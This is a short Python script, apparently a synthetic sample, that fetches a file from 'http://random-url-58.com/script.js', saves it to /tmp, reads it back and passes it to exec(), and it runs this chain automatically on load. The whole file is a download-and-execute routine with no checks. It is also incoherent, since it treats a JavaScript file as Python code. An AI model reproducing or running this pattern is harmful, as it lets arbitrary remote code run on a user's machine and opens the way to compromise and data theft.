from urllib.request import urlopen
import os

def get_remote_code(url):
    with urlopen(url) as response:
        return response.read().decode()

def save_code_to_file(file_path, code):
    with open(file_path, "w") as f:
        f.write(code)

def read_code_from_file(file_path):
    with open(file_path, "r") as f:
        return f.read()

def run_fetched_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-58.com/script.js"
    local_file = "/tmp/script58.js"

    downloaded_code = get_remote_code(random_url)
    save_code_to_file(local_file, downloaded_code)

    code_to_execute = read_code_from_file(local_file)
    run_fetched_code(code_to_execute)

main()
